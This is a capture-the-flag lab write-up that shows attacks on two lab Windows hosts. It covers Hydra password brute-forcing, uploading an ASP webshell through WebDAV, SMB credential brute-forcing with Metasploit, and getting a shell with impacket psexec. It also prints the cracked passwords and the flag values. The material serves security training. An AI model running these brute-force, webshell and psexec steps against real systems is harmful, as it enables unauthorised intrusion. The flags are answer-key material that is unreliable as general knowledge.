
---

# Lab Environment

In this lab environment, you will be provided with GUI access to a Kali Linux machine. Two machines are accessible at **http://target1.ine.local** and  **http://target2.ine.local**.

**Objective:** Perform system/host-based attacks on the target and capture all the flags hidden within the environment.

**Useful files:**

```
/usr/share/metasploit-framework/data/wordlists/common_users.txt, 
/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt,
/usr/share/webshells/asp/webshell.asp
```

**Flags to Capture:**

- **Flag 1**: User 'bob' might not have chosen a strong password. Try common passwords to gain access to the server where the flag is located. (target1.ine.local)
- **Flag 2**: Valuable files are often on the C: drive. Explore it thoroughly. (target1.ine.local)
- **Flag 3**: By attempting to guess SMB user credentials, you may uncover important information that could lead you to the next flag. (target2.ine.local)
- **Flag 4**: The Desktop directory might have what you're looking for. Enumerate its contents. (target2.ine.local)

# Tools

The best tools for this lab are:

- Nmap
- Hydra
- Cadaver
- Metasploit Framework

---

## First Target

We will start with Nmap scan:`nmap -Pn -A -v -p- target1.ine.local`

We find that the first target is running a http server. If we visited the website, we find that it is blocked behind a login prompt. The lab instructions told us that the username is bob. We only need to find valid password for this username, and for this, we will use hydra:`hydra -l bob -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt target1.ine.local http-get`

The valid password for username bob is :"password_123321"

Now, to perform a directory search by also providing valid credentials, we will use dirb:`dirb http://target1.ine.local/ -u bob:password_123321` 

We find that Webdav is running on the target.

To test what files can be uploaded and ran on Webdav, we will use davtest:`davtest -auth bob:password_123321 -url http://target1.ine.local/webdav/` 

One of the files that can be uploaded and executed is a .asp file. This is great since Kali comes with a reverse web shell .asp file and this could be found in:"/usr/share/webshells/asp/webshell.asp"

To upload the file, we will use cadaver: `cadaver http://target1.ine.local/webdav`

After providing the valid credentials for user bob, we will upload the .asp payload file: `put /usr/share/webshells/asp/webshell.asp `

This will upload the file to the webserver and we can execute it if we clicked on the file name in the webdav directory.

This code gives us a text field where we can execute commands, to get the second flag:`type "C:\flag2.txt"` The first flag can be found in the webdav directory

**First flag**: cb021a24cb874d96a59a071f96107b02

**Second flag:** af66042fa2d84bf5bde439eef72ce4e1

---

## Second Target:

We will start with Nmap scan:`nmap -Pn -A -v -p- target2.ine.local` . This target is clearly running a smb server, we will use Metasploit to get valid credentials.

After starting msfconsole, we will use this auxiliary module: "scanner/smb/smb_login" to brute-force the smb service to get valid credentials. After setting the right settings for the user_file, pass_file and RHOSTS, we will get these credentials:
rooty:spongebob
demo:password1
auditor:hellokitty
administrator:pineapple. 
We need to make sure that STOP_ON_SUCCESS option is set to false.

Since we have valid credentials, we will use psexec.py to have a reverse shell on the target machine. We will find psexec.py in : /usr/share/doc/python3-impacket/examples.

We will use the administrator credentials: `python3 ./psexec.py administrator:pineapple@(second target IP)`

We will get reverse shell to the target.

We will find the third flag in the "C:" directory and the forth flag in:"C:\Users\Administrator\Desktop"

**Third flag:** bcb8d43900474106823bba1f4a28268d

**Forth flag:** 6526b42fe35340ed864de9041c0cac55


